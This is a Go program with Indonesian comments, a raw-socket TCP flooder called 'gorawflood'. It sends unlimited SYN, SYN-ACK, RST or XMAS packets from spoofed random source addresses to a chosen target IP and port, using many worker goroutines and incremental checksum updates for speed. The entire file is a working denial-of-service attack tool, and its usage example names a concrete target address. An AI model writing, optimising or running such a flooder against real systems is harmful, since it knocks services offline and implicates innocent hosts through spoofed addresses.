package main

import (
	"crypto/rand"
	"encoding/binary"
	"flag"
	"fmt"
	"net"
	"os"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

// Menghitung Checksum standar (digunakan untuk inisialisasi awal)
func checksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum > 0xffff {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return uint16(^sum)
}

// OPTIMASI KINERJA: Update checksum secara inkremental (jauh lebih cepat daripada hitung ulang)
func updateChecksum(oldCsum uint16, oldVal, newVal uint16) uint16 {
	sum := uint32(^oldCsum) + uint32(^oldVal) + uint32(newVal)
	for sum > 0xffff {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return uint16(^sum)
}

func getRandomIP() [4]byte {
	var ip [4]byte
	for {
		rand.Read(ip[:])
		if ip[0] != 0 && ip[0] != 10 && ip[0] != 127 && ip[0] != 192 && ip[0] < 240 {
			break
		}
	}
	return ip
}

func getRandomPort() uint16 {
	var b [2]byte
	rand.Read(b[:])
	port := binary.BigEndian.Uint16(b[:])
	if port < 1024 {
		port += 1024
	}
	return port
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())

	// Flag/Argumen Baru untuk Mode Serangan
	targetIPStr := flag.String("t", "", "IP Target (Destinasi)")
	targetPort := flag.Int("p", 80, "Port Target")
	ifaceName := flag.String("i", "eth0", "Interface Jaringan (misal: eth0)")
	workerCount := flag.Int("w", runtime.NumCPU()*2, "Jumlah Worker")
	attackMode := flag.String("m", "synack", "Mode Serangan: syn, synack, rst, xmas")
	flag.Parse()

	if *targetIPStr == "" {
		fmt.Println("Error: IP Target wajib diisi!")
		fmt.Println("Contoh: sudo ./gorawflood -t 45.192.223.67 -i eth0 -m syn -w 8")
		os.Exit(1)
	}

	targetIP := net.ParseIP(*targetIPStr).To4()
	if targetIP == nil {
		fmt.Println("Error: Format IP Target tidak valid!")
		os.Exit(1)
	}

	// Tentukan Flag TCP berdasarkan mode yang dipilih
	var tcpFlag byte
	switch strings.ToLower(*attackMode) {
	case "syn":
		tcpFlag = 0x02 // SYN
	case "synack":
		tcpFlag = 0x12 // SYN + ACK
	case "rst":
		tcpFlag = 0x04 // RST
	case "xmas":
		tcpFlag = 0x29 // FIN + PSH + URG
	default:
		fmt.Printf("Mode '%s' tidak dikenal. Menggunakan mode default: synack\n", *attackMode)
		tcpFlag = 0x12
		*attackMode = "synack"
	}

	fmt.Printf("=== ULTRA HIGH-PERFORMANCE RAW FLOODER ===\n")
	fmt.Printf("Target       : %s:%d\n", *targetIPStr, *targetPort)
	fmt.Printf("Interface    : %s\n", *ifaceName)
	fmt.Printf("Mode Serangan: %s (Flag: 0x%02x)\n", strings.ToUpper(*attackMode), tcpFlag)
	fmt.Printf("Total Worker : %d (Optimasi Inkremental Aktif)\n", *workerCount)
	fmt.Println("--------------------------------------------------")
	time.Sleep(2 * time.Second)

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		fmt.Printf("Gagal membuat socket: %v\n", err)
		os.Exit(1)
	}
	defer syscall.Close(fd)

	err = syscall.BindToDevice(fd, *ifaceName)
	if err != nil {
		fmt.Printf("Gagal mengikat ke interface %s: %v\n", *ifaceName, err)
		os.Exit(1)
	}

	var destAddr [4]byte
	copy(destAddr[:], targetIP)
	sockAddr := syscall.SockaddrInet4{
		Port: *targetPort,
		Addr: destAddr,
	}

	var wg sync.WaitGroup

	for i := 0; i < *workerCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			packet := make([]byte, 40)

			// --- IP HEADER (Template Statis) ---
			packet[0] = 0x45
			packet[1] = 0x00
			binary.BigEndian.PutUint16(packet[2:4], 40)
			binary.BigEndian.PutUint16(packet[4:6], 54321)
			binary.BigEndian.PutUint16(packet[6:8], 0x0000)
			packet[8] = 64
			packet[9] = 6 // TCP
			copy(packet[16:20], targetIP)

			// --- TCP HEADER (Template Statis) ---
			binary.BigEndian.PutUint16(packet[22:24], uint16(*targetPort))
			binary.BigEndian.PutUint32(packet[24:28], 1234567)
			binary.BigEndian.PutUint32(packet[28:32], 7654321)
			packet[32] = 0x50
			packet[33] = tcpFlag
			binary.BigEndian.PutUint16(packet[34:36], 1024)

			// Hitung baseline Checksum IP awal (dengan IP asal kosong 0.0.0.0)
			ipChecksumBaseline := checksum(packet[0:20])

			// Pseudo header awal untuk baseline Checksum TCP
			pseudoHeader := make([]byte, 12+20)
			copy(pseudoHeader[4:8], targetIP)
			pseudoHeader[9] = 6
			binary.BigEndian.PutUint16(pseudoHeader[10:12], 20)
			copy(pseudoHeader[12:], packet[20:40])
			tcpChecksumBaseline := checksum(pseudoHeader)

			// Loop Utama: Tanpa batas kecepatan + Optimasi matematika
			for {
				srcIP := getRandomIP()
				srcPort := getRandomPort()

				// 1. UPDATE IP HEADER & CHECKSUM (Inkremental)
				copy(packet[12:16], srcIP[:])
				ipPart1 := binary.BigEndian.Uint16(srcIP[0:2])
				ipPart2 := binary.BigEndian.Uint16(srcIP[2:4])
				
				// Modifikasi checksum awal hanya dengan menambahkan komponen IP baru
				ipCsum := updateChecksum(ipChecksumBaseline, 0x0000, ipPart1)
				ipCsum = updateChecksum(ipCsum, 0x0000, ipPart2)
				binary.BigEndian.PutUint16(packet[10:12], ipCsum)

				// 2. UPDATE TCP HEADER & CHECKSUM (Inkremental)
				binary.BigEndian.PutUint16(packet[20:22], srcPort)
				
				// Modifikasi checksum awal berdasarkan perubahan IP Asal dan Port Asal
				tcpCsum := updateChecksum(tcpChecksumBaseline, 0x0000, ipPart1)
				tcpCsum = updateChecksum(tcpCsum, 0x0000, ipPart2)
				tcpCsum = updateChecksum(tcpCsum, 0x0000, srcPort)
				binary.BigEndian.PutUint16(packet[36:38], tcpCsum)

				// 3. KIRIM PAKET INSTAN
				_ = syscall.Sendto(fd, packet, 0, &sockAddr)
			}
		}()
	}

	wg.Wait()
}
